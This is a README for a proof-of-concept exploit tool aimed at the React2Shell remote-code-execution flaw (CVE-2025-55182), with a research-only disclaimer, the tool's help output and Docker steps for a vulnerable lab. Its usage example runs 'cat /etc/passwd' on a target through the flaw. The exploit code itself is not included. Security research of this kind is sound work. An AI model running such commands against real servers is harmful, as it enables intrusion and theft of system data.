This Proof of Concept (PoC) for React2Shell (CVE-2025-55182) vulnerability has been developed strictly for educational and research purposes only.

It is intended to demonstrate the existence and potential impact of a specific security vulnerability in a controlled, authorized, and non-production environment.

Check out my blog for detailed analysis of the react2shell vulnerability: https://vxsnipe.xyz/posts/react2shell/

## Usage

```
➜ python poc.py -h

      _____  ______          _____ _______ ___   _____ _    _ ______ _      _
     |  __ \|  ____|   /\   / ____|__   __|__ \ / ____| |  | |  ____| |    | |
     | |__) | |__     /  \ | |       | |     ) | (___ | |__| | |__  | |    | |
     |  _  /|  __|   / /\ \| |       | |    / / \___ \|  __  |  __| | |    | |
     | | \ \| |____ / ____ \ |____   | |   / /_ ____) | |  | | |____| |____| |____
     |_|  \_\______/_/    \_\_____|  |_|  |____|_____/|_|  |_|______|______|______|

usage: poc.py [-h] -u URL -c COMMAND

CVE-2025-55182 POC by 0xSN1PE

options:
  -h, --help            show this help message and exit
  -u, --url URL         Target URL (e.g., http://localhost:3000/)
  -c, --command COMMAND
                        Command to execute (e.g., 'id')

➜ python poc.py -u http://localhost:3000/ -c 'cat /etc/passwd'
```

## Testing environment setup with docker

This POC comes with a docker file that can be used to simulate the react2shell vulnerability in a controlled and safe environment.

```
docker build -t react2shell .
docker run -p 3000:3000 react2shell
```

